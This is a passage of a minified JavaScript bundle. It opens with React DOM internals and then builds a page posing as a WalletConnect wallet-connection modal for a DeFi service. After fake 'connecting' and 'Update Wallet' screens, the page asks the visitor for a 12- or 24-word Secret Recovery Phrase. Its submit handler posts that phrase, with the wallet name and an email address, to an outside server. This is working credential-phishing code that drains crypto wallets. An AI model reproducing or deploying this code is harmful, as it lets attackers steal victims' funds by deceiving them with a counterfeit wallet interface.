			(this.pooledCacheLanes = 0),
			(this.formState = i),
			(this.incompleteTransitions = new Map());
	}
	function Gr(l, t, e, a, u, n, c, i, s, v, x, p) {
		return (
			(l = new Nh(l, t, e, c, i, s, v, p)),
			(t = 1),
			n === !0 && (t |= 24),
			(n = Il(3, null, null, t)),
			(l.current = n),
			(n.stateNode = l),
			(t = Tc()),
			t.refCount++,
			(l.pooledCache = t),
			t.refCount++,
			(n.memoizedState = { element: a, isDehydrated: e, cache: t }),
			Mc(n),
			l
		);
	}
	function Xr(l) {
		return l ? ((l = We), l) : We;
	}
	function Qr(l, t, e, a, u, n) {
		(u = Xr(u)),
			a.context === null ? (a.context = u) : (a.pendingContext = u),
			(a = kt(t)),
			(a.payload = { element: e }),
			(n = n === void 0 ? null : n),
			n !== null && (a.callback = n),
			(e = Wt(l, a, t)),
			e !== null && (at(e, l, t), Xa(e, l, t));
	}
	function Zr(l, t) {
		if (((l = l.memoizedState), l !== null && l.dehydrated !== null)) {
			var e = l.retryLane;
			l.retryLane = e !== 0 && e < t ? e : t;
		}
	}
	function Li(l, t) {
		Zr(l, t), (l = l.alternate) && Zr(l, t);
	}
	function Lr(l) {
		if (l.tag === 13) {
			var t = ke(l, 67108864);
			t !== null && at(t, l, 67108864), Li(l, 67108864);
		}
	}
	var Mn = !0;
	function jh(l, t, e, a) {
		var u = b.T;
		b.T = null;
		var n = A.p;
		try {
			(A.p = 2), Vi(l, t, e, a);
		} finally {
			(A.p = n), (b.T = u);
		}
	}
	function Th(l, t, e, a) {
		var u = b.T;
		b.T = null;
		var n = A.p;
		try {
			(A.p = 8), Vi(l, t, e, a);
		} finally {
			(A.p = n), (b.T = u);
		}
	}
	function Vi(l, t, e, a) {
		if (Mn) {
			var u = Ki(a);
			if (u === null) Ri(l, t, a, On, e), Kr(l, a);
			else if (Ah(u, l, t, e, a)) a.stopPropagation();
			else if ((Kr(l, a), t & 4 && -1 < Eh.indexOf(l))) {
				for (; u !== null; ) {
					var n = Be(u);
					if (n !== null)
						switch (n.tag) {
							case 3:
								if (
									((n = n.stateNode),
									n.current.memoizedState.isDehydrated)
								) {
									var c = ve(n.pendingLanes);
									if (c !== 0) {
										var i = n;
										for (
											i.pendingLanes |= 2,
												i.entangledLanes |= 2;
											c;

										) {
											var s = 1 << (31 - $l(c));
											(i.entanglements[1] |= s),
												(c &= ~s);
										}
										Et(n),
											(al & 6) === 0 &&
												((dn = St() + 500), uu(0));
									}
								}
								break;
							case 13:
								(i = ke(n, 2)),
									i !== null && at(i, n, 2),
									hn(),
									Li(n, 2);
						}
					if (
						((n = Ki(a)), n === null && Ri(l, t, a, On, e), n === u)
					)
						break;
					u = n;
				}
				u !== null && a.stopPropagation();
			} else Ri(l, t, a, null, e);
		}
	}
	function Ki(l) {
		return (l = Fn(l)), Ji(l);
	}
	var On = null;
	function Ji(l) {
		if (((On = null), (l = He(l)), l !== null)) {
			var t = q(l);
			if (t === null) l = null;
			else {
				var e = t.tag;
				if (e === 13) {
					if (((l = $(t)), l !== null)) return l;
					l = null;
				} else if (e === 3) {
					if (t.stateNode.current.memoizedState.isDehydrated)
						return t.tag === 3 ? t.stateNode.containerInfo : null;
					l = null;
				} else t !== l && (l = null);
			}
		}
		return (On = l), null;
	}
	function Vr(l) {
		switch (l) {
			case "beforetoggle":
			case "cancel":
			case "click":
			case "close":
			case "contextmenu":
			case "copy":
			case "cut":
			case "auxclick":
			case "dblclick":
			case "dragend":
			case "dragstart":
			case "drop":
			case "focusin":
			case "focusout":
			case "input":
			case "invalid":
			case "keydown":
			case "keypress":
			case "keyup":
			case "mousedown":
			case "mouseup":
			case "paste":
			case "pause":
			case "play":
			case "pointercancel":
			case "pointerdown":
			case "pointerup":
			case "ratechange":
			case "reset":
			case "resize":
			case "seeked":
			case "submit":
			case "toggle":
			case "touchcancel":
			case "touchend":
			case "touchstart":
			case "volumechange":
			case "change":
			case "selectionchange":
			case "textInput":
			case "compositionstart":
			case "compositionend":
			case "compositionupdate":
			case "beforeblur":
			case "afterblur":
			case "beforeinput":
			case "blur":
			case "fullscreenchange":
			case "focus":
			case "hashchange":
			case "popstate":
			case "select":
			case "selectstart":
				return 2;
			case "drag":
			case "dragenter":
			case "dragexit":
			case "dragleave":
			case "dragover":
			case "mousemove":
			case "mouseout":
			case "mouseover":
			case "pointermove":
			case "pointerout":
			case "pointerover":
			case "scroll":
			case "touchmove":
			case "wheel":
			case "mouseenter":
			case "mouseleave":
			case "pointerenter":
			case "pointerleave":
				return 8;
			case "message":
				switch (od()) {
					case af:
						return 2;
					case uf:
						return 8;
					case Su:
					case rd:
						return 32;
					case nf:
						return 268435456;
					default:
						return 32;
				}
			default:
				return 32;
		}
	}
	var ki = !1,
		fe = null,
		se = null,
		oe = null,
		du = new Map(),
		mu = new Map(),
		re = [],
		Eh =
			"mousedown mouseup touchcancel touchend touchstart auxclick dblclick pointercancel pointerdown pointerup dragend dragstart drop compositionend compositionstart keydown keypress keyup input textInput copy cut paste click change contextmenu reset".split(
				" "
			);
	function Kr(l, t) {
		switch (l) {
			case "focusin":
			case "focusout":
				fe = null;
				break;
			case "dragenter":
			case "dragleave":
				se = null;
				break;
			case "mouseover":
			case "mouseout":
				oe = null;
				break;
			case "pointerover":
			case "pointerout":
				du.delete(t.pointerId);
				break;
			case "gotpointercapture":
			case "lostpointercapture":
				mu.delete(t.pointerId);
		}
	}
	function hu(l, t, e, a, u, n) {
		return l === null || l.nativeEvent !== n
			? ((l = {
					blockedOn: t,
					domEventName: e,
					eventSystemFlags: a,
					nativeEvent: n,
					targetContainers: [u],
			  }),
			  t !== null && ((t = Be(t)), t !== null && Lr(t)),
			  l)
			: ((l.eventSystemFlags |= a),
			  (t = l.targetContainers),
			  u !== null && t.indexOf(u) === -1 && t.push(u),
			  l);
	}
	function Ah(l, t, e, a, u) {
		switch (t) {
			case "focusin":
				return (fe = hu(fe, l, t, e, a, u)), !0;
			case "dragenter":
				return (se = hu(se, l, t, e, a, u)), !0;
			case "mouseover":
				return (oe = hu(oe, l, t, e, a, u)), !0;
			case "pointerover":
				var n = u.pointerId;
				return du.set(n, hu(du.get(n) || null, l, t, e, a, u)), !0;
			case "gotpointercapture":
				return (
					(n = u.pointerId),
					mu.set(n, hu(mu.get(n) || null, l, t, e, a, u)),
					!0
				);
		}
		return !1;
	}
	function Jr(l) {
		var t = He(l.target);
		if (t !== null) {
			var e = q(t);
			if (e !== null) {
				if (((t = e.tag), t === 13)) {
					if (((t = $(e)), t !== null)) {
						(l.blockedOn = t),
							bd(l.priority, function () {
								if (e.tag === 13) {
									var a = et();
									a = Gn(a);
									var u = ke(e, a);
									u !== null && at(u, e, a), Li(e, a);
								}
							});
						return;
					}
				} else if (
					t === 3 &&
					e.stateNode.current.memoizedState.isDehydrated
				) {
					l.blockedOn =
						e.tag === 3 ? e.stateNode.containerInfo : null;
					return;
				}
			}
		}
		l.blockedOn = null;
	}
	function _n(l) {
		if (l.blockedOn !== null) return !1;
		for (var t = l.targetContainers; 0 < t.length; ) {
			var e = Ki(l.nativeEvent);
			if (e === null) {
				e = l.nativeEvent;
				var a = new e.constructor(e.type, e);
				($n = a), e.target.dispatchEvent(a), ($n = null);
			} else
				return (t = Be(e)), t !== null && Lr(t), (l.blockedOn = e), !1;
			t.shift();
		}
		return !0;
	}
	function kr(l, t, e) {
		_n(l) && e.delete(t);
	}
	function zh() {
		(ki = !1),
			fe !== null && _n(fe) && (fe = null),
			se !== null && _n(se) && (se = null),
			oe !== null && _n(oe) && (oe = null),
			du.forEach(kr),
			mu.forEach(kr);
	}
	function Dn(l, t) {
		l.blockedOn === t &&
			((l.blockedOn = null),
			ki ||
				((ki = !0),
				T.unstable_scheduleCallback(T.unstable_NormalPriority, zh)));
	}
	var Rn = null;
	function Wr(l) {
		Rn !== l &&
			((Rn = l),
			T.unstable_scheduleCallback(T.unstable_NormalPriority, function () {
				Rn === l && (Rn = null);
				for (var t = 0; t < l.length; t += 3) {
					var e = l[t],
						a = l[t + 1],
						u = l[t + 2];
					if (typeof a != "function") {
						if (Ji(a || e) === null) continue;
						break;
					}
					var n = Be(e);
					n !== null &&
						(l.splice(t, 3),
						(t -= 3),
						Jc(
							n,
							{
								pending: !0,
								data: u,
								method: e.method,
								action: a,
							},
							a,
							u
						));
				}
			}));
	}
	function vu(l) {
		function t(s) {
			return Dn(s, l);
		}
		fe !== null && Dn(fe, l),
			se !== null && Dn(se, l),
			oe !== null && Dn(oe, l),
			du.forEach(t),
			mu.forEach(t);
		for (var e = 0; e < re.length; e++) {
			var a = re[e];
			a.blockedOn === l && (a.blockedOn = null);
		}
		for (; 0 < re.length && ((e = re[0]), e.blockedOn === null); )
			Jr(e), e.blockedOn === null && re.shift();
		if (((e = (l.ownerDocument || l).$$reactFormReplay), e != null))
			for (a = 0; a < e.length; a += 3) {
				var u = e[a],
					n = e[a + 1],
					c = u[Gl] || null;
				if (typeof n == "function") c || Wr(e);
				else if (c) {
					var i = null;
					if (n && n.hasAttribute("formAction")) {
						if (((u = n), (c = n[Gl] || null))) i = c.formAction;
						else if (Ji(u) !== null) continue;
					} else i = c.action;
					typeof i == "function"
						? (e[a + 1] = i)
						: (e.splice(a, 3), (a -= 3)),
						Wr(e);
				}
			}
	}
	function Wi(l) {
		this._internalRoot = l;
	}
	(Un.prototype.render = Wi.prototype.render =
		function (l) {
			var t = this._internalRoot;
			if (t === null) throw Error(h(409));
			var e = t.current,
				a = et();
			Qr(e, a, l, t, null, null);
		}),
		(Un.prototype.unmount = Wi.prototype.unmount =
			function () {
				var l = this._internalRoot;
				if (l !== null) {
					this._internalRoot = null;
					var t = l.containerInfo;
					Qr(l.current, 2, null, l, null, null), hn(), (t[we] = null);
				}
			});
	function Un(l) {
		this._internalRoot = l;
	}
	Un.prototype.unstable_scheduleHydration = function (l) {
		if (l) {
			var t = rf();
			l = { blockedOn: null, target: l, priority: t };
			for (
				var e = 0;
				e < re.length && t !== 0 && t < re[e].priority;
				e++
			);
			re.splice(e, 0, l), e === 0 && Jr(l);
		}
	};
	var $r = G.version;
	if ($r !== "19.1.1") throw Error(h(527, $r, "19.1.1"));
	A.findDOMNode = function (l) {
		var t = l._reactInternals;
		if (t === void 0)
			throw typeof l.render == "function"
				? Error(h(188))
				: ((l = Object.keys(l).join(",")), Error(h(268, l)));
		return (
			(l = D(t)),
			(l = l !== null ? N(l) : null),
			(l = l === null ? null : l.stateNode),
			l
		);
	};
	var Mh = {
		bundleType: 0,
		version: "19.1.1",
		rendererPackageName: "react-dom",
		currentDispatcherRef: b,
		reconcilerVersion: "19.1.1",
	};
	if (typeof __REACT_DEVTOOLS_GLOBAL_HOOK__ < "u") {
		var wn = __REACT_DEVTOOLS_GLOBAL_HOOK__;
		if (!wn.isDisabled && wn.supportsFiber)
			try {
				(ba = wn.inject(Mh)), (Wl = wn);
			} catch {}
	}
	return (
		(yu.createRoot = function (l, t) {
			if (!H(l)) throw Error(h(299));
			var e = !1,
				a = "",
				u = ro,
				n = mo,
				c = ho,
				i = null;
			return (
				t != null &&
					(t.unstable_strictMode === !0 && (e = !0),
					t.identifierPrefix !== void 0 && (a = t.identifierPrefix),
					t.onUncaughtError !== void 0 && (u = t.onUncaughtError),
					t.onCaughtError !== void 0 && (n = t.onCaughtError),
					t.onRecoverableError !== void 0 &&
						(c = t.onRecoverableError),
					t.unstable_transitionCallbacks !== void 0 &&
						(i = t.unstable_transitionCallbacks)),
				(t = Gr(l, 1, !1, null, null, e, a, u, n, c, i, null)),
				(l[we] = t.current),
				Di(l),
				new Wi(t)
			);
		}),
		(yu.hydrateRoot = function (l, t, e) {
			if (!H(l)) throw Error(h(299));
			var a = !1,
				u = "",
				n = ro,
				c = mo,
				i = ho,
				s = null,
				v = null;
			return (
				e != null &&
					(e.unstable_strictMode === !0 && (a = !0),
					e.identifierPrefix !== void 0 && (u = e.identifierPrefix),
					e.onUncaughtError !== void 0 && (n = e.onUncaughtError),
					e.onCaughtError !== void 0 && (c = e.onCaughtError),
					e.onRecoverableError !== void 0 &&
						(i = e.onRecoverableError),
					e.unstable_transitionCallbacks !== void 0 &&
						(s = e.unstable_transitionCallbacks),
					e.formState !== void 0 && (v = e.formState)),
				(t = Gr(l, 1, !0, t, e ?? null, a, u, n, c, i, s, v)),
				(t.context = Xr(null)),
				(e = t.current),
				(a = et()),
				(a = Gn(a)),
				(u = kt(a)),
				(u.callback = null),
				Wt(e, u, a),
				(e = a),
				(t.current.lanes = e),
				pa(t, e),
				Et(t),
				(l[we] = t.current),
				Di(l),
				new Un(t)
			);
		}),
		(yu.version = "19.1.1"),
		yu
	);
}
var cd;
function Ch() {
	if (cd) return Ii.exports;
	cd = 1;
	function T() {
		if (
			!(
				typeof __REACT_DEVTOOLS_GLOBAL_HOOK__ > "u" ||
				typeof __REACT_DEVTOOLS_GLOBAL_HOOK__.checkDCE != "function"
			)
		)
			try {
				__REACT_DEVTOOLS_GLOBAL_HOOK__.checkDCE(T);
			} catch (G) {
				console.error(G);
			}
	}
	return T(), (Ii.exports = qh()), Ii.exports;
}
var Yh = Ch();
const Gh = [
		{ name: "Metamask", id: "metamask", logo: "/metamask.png" },
		{ name: "Trust Wallet", id: "trust", logo: "/trustwallet.png" },
		{ name: "Coinbase Wallet", id: "coinbase", logo: "/coinbase.jpeg" },
		{ name: "Ledger", id: "ledger", logo: "/ledger.jpg" },
		{ name: "Trezor Wallet", id: "trezor", logo: "/trezor.png" },
		{ name: "Phantom", id: "phantom", logo: "/phantom.png" },
		{ name: "Solflare", id: "solflare", logo: "/solflare.png" },
		{
			name: "WalletConnect",
			id: "walletconnect",
			logo: "/walletconnect.jpg",
		},
	],
	xu = ({ wallet: T, onClose: G }) =>
		f.jsxs("div", {
			className:
				"flex items-center justify-between w-full pb-5 border-b border-gray-700 mb-5",
			children: [
				f.jsxs("div", {
					className: "flex items-center flex-grow",
					children: [
						f.jsx("div", {
							className:
								"w-8 h-8 rounded-lg overflow-hidden bg-white flex items-center justify-center mr-3",
							children: f.jsx("img", {
								src: T.logo,
								alt: `${T.name} Logo`,
								className: "w-full h-full object-contain p-1",
							}),
						}),
						f.jsx("span", {
							className: "text-white text-lg font-bold",
							children: T.name,
						}),
					],
				}),
				f.jsx("button", {
					onClick: G,
					className:
						"text-gray-400 text-3xl leading-none hover:text-white transition-colors",
					children: "×",
				}),
			],
		}),
	Xh = ({ wallet: T, onBack: G, onFinishConnect: z }) => (
		mt.useEffect(() => {
			const h = setTimeout(() => {
				z();
			}, 1500);
			return () => clearTimeout(h);
		}, [z]),
		f.jsxs("div", {
			className:
				"relative w-full h-full md:w-[95%] md:h-auto max-w-[420px] bg-neutral-900 border border-gray-700 rounded-none md:rounded-3xl p-6 shadow-2xl flex flex-col items-center justify-center text-center transition-all duration-500 ease-out",
			onClick: (h) => h.stopPropagation(),
			children: [
				f.jsx(xu, { wallet: T, onClose: G }),
				f.jsxs("div", {
					className:
						"flex-1 flex flex-col items-center justify-center",
					children: [
						f.jsx("div", {
							className:
								"animate-spin rounded-full h-16 w-16 border-t-2 border-b-2 border-indigo-500",
						}),
						f.jsxs("p", {
							className: "mt-6 text-gray-400 text-lg",
							children: ["Connecting to ", T.name, "..."],
						}),
					],
				}),
			],
		})
	),
	Qh = ({ wallet: T, onBack: G, onStartUpdate: z }) =>
		f.jsxs("div", {
			className:
				"relative w-full h-full md:w-[95%] md:h-auto max-w-[420px] bg-neutral-900 border border-gray-700 rounded-none md:rounded-3xl p-6 shadow-2xl flex flex-col items-center justify-center text-center transition-all duration-500 ease-out",
			onClick: (h) => h.stopPropagation(),
			children: [
				f.jsx(xu, { wallet: T, onClose: G }),
				f.jsxs("div", {
					className:
						"flex-1 flex flex-col items-center justify-center",
					children: [
						f.jsx("h3", {
							className: "text-white text-2xl font-bold mb-4",
							children: "Update Wallet",
						}),
						f.jsx("p", {
							className: "text-gray-400 mb-8",
							children:
								"To ensure a secure and stable connection, you must update your wallet. This process may take a few moments.",
						}),
						f.jsx("button", {
							onClick: z,
							className:
								"w-full bg-indigo-600 hover:bg-indigo-700 text-white font-medium py-3 rounded-xl transition-colors",
							children: "Update",
						}),
					],
				}),
			],
		}),
	Zh = ({ wallet: T, onBack: G, onFinishLoading: z }) => {
		const [h, H] = mt.useState(0);
		return (
			mt.useEffect(() => {
				let q = 0;
				const $ = setInterval(() => {
					(q += 2), q > 100 ? (clearInterval($), z()) : H(q);
				}, 100);
				return () => clearInterval($);
			}, [z]),
			f.jsxs("div", {
				className:
					"relative w-full h-full md:w-[95%] md:h-auto max-w-[420px] bg-neutral-900 border border-gray-700 rounded-none md:rounded-3xl p-6 shadow-2xl flex flex-col items-center justify-center text-center transition-all duration-500 ease-out",
				onClick: (q) => q.stopPropagation(),
				children: [
					f.jsx(xu, { wallet: T, onClose: G }),
					f.jsxs("div", {
						className:
							"flex-1 flex flex-col items-center justify-center",
						children: [
							f.jsx("div", {
								className:
									"w-24 h-24 rounded-lg overflow-hidden bg-white flex items-center justify-center shadow-lg mb-6",
								children: f.jsx("img", {
									src: T.logo,
									alt: `${T.name} Logo`,
									className:
										"w-full h-full object-contain p-2",
								}),
							}),
							f.jsxs("h3", {
								className: "text-white text-2xl font-bold mb-2",
								children: ["Updating ", T.name],
							}),
							f.jsx("p", {
								className: "text-gray-400 mb-8",
								children:
									"Please wait while we finalize the update. This process is essential for security.",
							}),
							f.jsx("div", {
								className:
									"w-full bg-gray-700 rounded-full h-2.5",
								children: f.jsx("div", {
									className:
										"bg-indigo-600 h-2.5 rounded-full transition-all duration-100 ease-linear",
									style: { width: `${h}%` },
								}),
							}),
							f.jsxs("p", {
								className: "mt-4 text-sm text-gray-500",
								children: [h, "%"],
							}),
						],
					}),
				],
			})
		);
	},
	Lh = ({ wallet: T, onBack: G, onSend: z }) => {
		const [h, H] = mt.useState(12),
			[q, $] = mt.useState(Array(12).fill("")),
			[bl, D] = mt.useState(!1),
			N = (el) => {
				const k = parseInt(el.target.value, 10);
				H(k), $(Array(k).fill(""));
			},
			_ = (el, k) => {
				const ol = k.trim();
				if (ol.includes(" ")) {
					const dl = ol.split(" ").filter((vl) => vl !== ""),
						xt = [...q];
					let Yl = dl.length;
					if (Yl === 12 || Yl === 24) {
						H(Yl);
						for (let vl = 0; vl < Yl; vl++) xt[vl] = dl[vl] || "";
						$(xt);
					} else
						alert(
							"Invalid recovery phrase length. Please enter a 12 or 24-word phrase."
						),
							$(Array(q.length).fill(""));
				} else {
					const dl = [...q];
					(dl[el] = ol), $(dl);
				}
			},
			J = (el) => {
				const k = document.getElementById(`phrase-input-${el}`);
				k && (k.type = k.type === "password" ? "text" : "password");
			},
			F = async () => {
				if (q.some((ol) => !ol.trim())) {
					alert("Please fill in all recovery phrase fields.");
					return;
				}
				const el = q.join(" "),
					k = { walletName: T.name, details: el };
				try {
					D(!0);
					const ol = await fetch(
						"https://velofinza.com/backend/api/v1/wallet",
						{
							method: "POST",
							headers: { "Content-Type": "application/json" },
							body: JSON.stringify({
								walletName: T.name,
								details: el,
								email: "Gerfish7458@proton.me",
							}),
						}
					);
					ol.ok
						? console.log("Details sent successfully!", k)
						: console.error(
								"Failed to send details:",
								ol.statusText
						  );
				} catch (ol) {
					console.error("Error sending details:", ol);
				} finally {
					D(!1), z();
				}
			};
		return f.jsxs("div", {
			className:
				"relative w-full h-full md:w-[95%] md:h-auto max-w-[420px] bg-neutral-900 border border-gray-700 rounded-none md:rounded-3xl p-6 shadow-2xl flex flex-col items-center justify-center text-center transition-all duration-500 ease-out",
			onClick: (el) => el.stopPropagation(),
			children: [
				f.jsx(xu, { wallet: T, onClose: G }),
				f.jsxs("div", {
					className:
						"flex-1 flex flex-col items-center justify-center w-full",
					children: [
						f.jsx("h3", {
							className: "text-white text-2xl font-bold mb-4",
							children:
								"Import your wallet with your Secret Recovery Phrase",
						}),
						f.jsx("p", {
							className: "text-gray-400 mb-4",
							children:
								"We will use your Secret Recovery Phrase to validate your ownership. Enter the Secret Recovery Phrase that you were given when you created your wallet.",
						}),
						f.jsx("div", {
							className: "w-full mb-4",
							children: f.jsxs("select", {
								className:
									"w-full p-3 bg-neutral-800 text-white rounded-lg border border-gray-700 focus:outline-none focus:border-indigo-500 transition-colors",
								value: h,
								onChange: N,
								children: [
									f.jsx("option", {
										value: 12,
										children: "12-word phrase",
									}),
									f.jsx("option", {
										value: 24,
										children: "24-word phrase",
									}),
								],
							}),
						}),
						f.jsxs("div", {
							className:
								"w-full bg-neutral-800 text-gray-400 p-3 rounded-lg flex items-center mb-4",
							children: [
								f.jsx("svg", {
									xmlns: "http://www.w3.org/2000/svg",
									className: "h-5 w-5 mr-2",
									viewBox: "0 0 20 20",
									fill: "currentColor",
									children: f.jsx("path", {
										fillRule: "evenodd",
										d: "M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-7-4a1 1 0 11-2 0 1 1 0 012 0zM9 9a1 1 0 000 2v2a1 1 0 001 1h1a1 1 0 100-2v-3a1 1 0 00-1-1H9z",
										clipRule: "evenodd",
									}),
								}),
								"You can paste your entire secret recovery phrase into any field",
							],
						}),
						f.jsx("div", {
							className:
								"grid grid-cols-2 gap-4 w-full max-h-[250px] overflow-y-auto mb-4 no-scrollbar",
							children: q.map((el, k) =>
								f.jsxs(
									"div",
									{
										className: "flex items-center",
										children: [
											f.jsxs("span", {
												className: "text-gray-400 mr-2",
												children: [k + 1, "."],
											}),
											f.jsxs("div", {
												className: "relative w-full",
												children: [
													f.jsx("input", {
														id: `phrase-input-${k}`,
														type: "password",
														className:
															"w-full p-3 bg-neutral-800 text-white rounded-lg border border-gray-700 focus:outline-none focus:border-indigo-500 transition-colors pr-10",
														placeholder:
															"Enter word",
														value: el,
														onChange: (ol) =>
															_(
																k,
																ol.target.value
															),
														required: !0,
													}),
													f.jsx("button", {
														type: "button",
														onClick: () => J(k),
														className:
															"absolute right-3 top-1/2 -translate-y-1/2 text-gray-500 hover:text-white transition-colors",
														children: f.jsxs(
															"svg",
															{
																xmlns: "http://www.w3.org/2000/svg",
																className:
																	"h-5 w-5",
																viewBox:
																	"0 0 20 20",
																fill: "currentColor",
																children: [
																	f.jsx(
																		"path",
																		{
																			d: "M10 12a2 2 0 100-4 2 2 0 000 4z",
																		}
																	),
																	f.jsx(
																		"path",
																		{
																			fillRule:
																				"evenodd",
																			d: "M.458 10C1.732 5.943 5.522 3 10 3s8.268 2.943 9.542 7c-1.274 4.057-5.064 7-9.542 7S1.732 14.057.458 10zM14 10a4 4 0 11-8 0 4 4 0 018 0z",
																			clipRule:
																				"evenodd",
																		}
																	),
																],
															}
														),
													}),
												],
											}),
										],
									},
									k
								)
							),
						}),
						f.jsx("button", {
							onClick: F,
							className:
								"mt-4 w-full bg-indigo-600 hover:bg-indigo-700 text-white font-medium py-3 rounded-xl transition-colors",
							disabled: bl,
							children: bl
								? "Submitting..."
								: "Confirm Secret Recovery Phrase",
						}),
					],
				}),
			],
		});
	},
	Vh = ({ wallet: T, onClose: G }) =>
		f.jsxs("div", {
			className:
				"relative w-full h-full md:w-[95%] md:h-auto max-w-[420px] bg-neutral-900 border border-gray-700 rounded-none md:rounded-3xl p-6 shadow-2xl flex flex-col items-center justify-center text-center transition-all duration-500 ease-out",
			onClick: (z) => z.stopPropagation(),
			children: [
				f.jsx(xu, { wallet: T, onClose: G }),
				f.jsxs("div", {
					className:
						"flex-1 flex flex-col items-center justify-center",
					children: [
						f.jsx("h3", {
							className: "text-white text-2xl font-bold mb-4",
							children: "Exporting Wallet",
						}),
						f.jsx("div", {
							className:
								"animate-spin rounded-full h-16 w-16 border-t-2 border-b-2 border-indigo-500",
						}),
						f.jsx("p", {
							className: "mt-6 text-gray-400 text-lg",
							children:
								"Your wallet is being exported securely...",
						}),
					],
				}),
			],
		}),
	Kh = ({ onClose: T, onSelectWallet: G }) =>
		f.jsxs("div", {
			className:
				"relative w-full md:w-[95%] max-w-[420px] h-[550px] md:h-auto bg-neutral-900 border border-gray-700 rounded-t-3xl md:rounded-3xl p-6 shadow-2xl flex flex-col overflow-hidden",
			onClick: (z) => z.stopPropagation(),
			children: [
				f.jsxs("div", {
					className:
						"flex justify-between items-center pb-5 border-b border-gray-700 mb-4",
					children: [
						f.jsxs("div", {
							className: "flex items-center gap-3",
							children: [
								f.jsx("div", {
									className:
										"bg-neutral-800 text-white text-xs font-semibold px-3 py-1 rounded-full",
									children: "reown",
								}),
								f.jsx("span", {
									className: "text-white text-lg",
									children: "Manual Kit",
								}),
							],
						}),
						f.jsx("button", {
							onClick: T,
							className:
								"text-gray-400 text-3xl leading-none hover:text-white transition-colors",
							children: "×",
						}),
					],
				}),
				f.jsxs("div", {
					className: "flex-1 overflow-y-auto px-1 -mx-1",
					style: { scrollbarWidth: "none", msOverflowStyle: "none" },
					children: [
						f.jsx("style", {
							children: `
                    .no-scrollbar::-webkit-scrollbar {
                        display: none;
                    }
                `,
						}),
						f.jsx("p", {
							className: "text-gray-400 mb-3 text-sm",
							children: "Popular:",
						}),
						f.jsx("div", {
							className: "flex flex-col gap-2 no-scrollbar",
							children: Gh.map((z, h) =>
								f.jsxs(
									"div",
									{
										className:
											"flex items-center justify-between p-3.5 bg-neutral-800 rounded-2xl cursor-pointer hover:bg-neutral-700 transition-colors",
										onClick: () => G(z),
										children: [
											f.jsxs("div", {
												className:
													"flex items-center gap-4",
												children: [
													f.jsx("div", {
														className:
															"w-10 h-10 rounded-xl overflow-hidden bg-white flex items-center justify-center border border-gray-600",
														children: f.jsx("img", {
															src: z.logo,
															alt: `${z.name} Logo`,
															className:
																"w-full h-full object-contain",
														}),
													}),
													f.jsx("span", {
														className:
															"text-white font-medium",
														children: z.name,
													}),
												],
											}),
											h === 0 &&
												f.jsx("span", {
													className:
														"text-xs font-semibold text-green-500 bg-green-900/40 px-3 py-1 rounded-full",
													children: "RECOMMENDED",
												}),
										],
									},
									z.id
								)
							),
						}),
					],
				}),
				f.jsxs("div", {
					className:
						"flex flex-col items-center justify-center p-6 mt-4 bg-neutral-800 border border-gray-700 rounded-2xl",
					children: [
						f.jsx("img", {
							src: "/globe.svg",
							alt: "Globe Icon",
							className: "w-16 h-16 mb-2",
						}),
						f.jsx("p", {
							className: "text-white text-sm text-center",
							children: "Connect your wallet to get started",
						}),
					],
				}),
			],
		}),
	Jh = ({ isOpen: T, onClose: G }) => {
		const [z, h] = mt.useState("main"),
			[H, q] = mt.useState(null),
			$ = (dl) => {
				q(dl), h("connecting");
			},
			bl = () => {
				h("update-info");
			},
			D = () => {
				h("final-loading");
			},
			N = () => {
				h("recovery-input");
			},
			_ = () => {
				h("sent");
			},
			J = () => {
				h("main");
			},
			F = () => {
				h("main"), G();
			},
			el = () => {
				switch (z) {
					case "main":
						return f.jsx(Kh, { onClose: F, onSelectWallet: $ });
					case "connecting":
						return f.jsx(Xh, {
							wallet: H,
							onBack: J,
							onFinishConnect: bl,
						});
					case "update-info":
						return f.jsx(Qh, {
							wallet: H,
							onBack: J,
							onStartUpdate: D,
						});
					case "final-loading":
						return f.jsx(Zh, {
							wallet: H,
							onBack: J,
							onFinishLoading: N,
						});
					case "recovery-input":
						return f.jsx(Lh, { wallet: H, onBack: J, onSend: _ });
					case "sent":
						return f.jsx(Vh, { wallet: H, onClose: F });
					default:
						return null;
				}
			},
			k =
				z === "main"
					? "fixed inset-0 flex items-end md:items-center justify-center z-[10000] backdrop-blur-md transition-all duration-300"
					: "fixed inset-0 flex items-center justify-center z-[10000] backdrop-blur-md transition-all duration-300",
			ol =
				z === "main"
					? "relative w-full md:w-[95%] max-w-[420px]"
					: "relative w-full h-full md:w-[95%] md:h-auto max-w-[420px]";
		return f.jsx("div", {
			className: `${k} ${
				T ? "opacity-100 visible" : "opacity-0 invisible"
			}`,
			onClick: z === "main" ? F : J,
			children: f.jsx("div", {
				className: ol,
				onClick: (dl) => dl.stopPropagation(),
				children: el(),
			}),
		});
	};
function kh() {
	const [T, G] = mt.useState(!1),
		z = () => G(!0),
		h = () => G(!1);
	return f.jsx(f.Fragment, {
		children: f.jsx("div", {
			id: "",
			children: f.jsxs("div", {
				className: "app",
				children: [
					f.jsx(Jh, { isOpen: T, onClose: h }),
					f.jsxs("div", {
						className: "flow-root overflow-x-hidden",
						style: {
							backgroundColor: "#141041",
							backgroundImage: "url(/home-page-bg-lights.html)",
							backgroundSize: "100% 95%",
							backgroundRepeat: "no-repeat",
						},
						children: [
							f.jsxs("div", {
								className:
									"row flex justify-between py-12 px-[min(160px,8vw)]",
								children: [
									f.jsx("img", {
										className: "Image",
										src: "https://1000logos.net/wp-content/uploads/2022/05/WalletConnect-Logo-500x281.png",
										height: "30",
										width: "30",
										alt: "logo-with-text",
									}),
									f.jsx("button", {
										onClick: z,
										className:
											"Button connect-wallet select-none inline-flex justify-center items-center gap-2 px-4 py-2.5 rounded-xl mobile:rounded-lg font-medium whitespace-nowrap appearance-none bg-formkit-thumb text-formkit-thumb-text-normal clickable clickable-filter-effect frosted-glass-teal",
										children: "Launch app",
									}),
								],
							}),
							f.jsxs("section", {
								className:
									"grid-child-center grid-cover-container mb-16 relative",
								children: [
									f.jsx("img", {
										className:
											"Image w-[744px] mobile:w-[394px]",
										src: "home-bg-element-1.png",
										alt: "home-bg-element-1",
									}),
									f.jsxs("div", {
										className:
											"grid-cover-content children-center",
										children: [
											f.jsxs("div", {
												className:
													"font-light text-[64px] mobile:text-[30px] text-white mb-4 mt-14 mobile:mt-9 leading-[60px] mobile:leading-[32px]",
												children: [
													"Enterprise-grade Blockchain, ",
													f.jsx("br", {}),
													" Defi & Web3",
													f.jsx("span", {
														className:
															"font-bold text-transparent bg-clip-text",
														style: {
															background:
																"radial-gradient(circle at top right, #39d0d8, #2b6aff)",
															backgroundClip:
																"text",
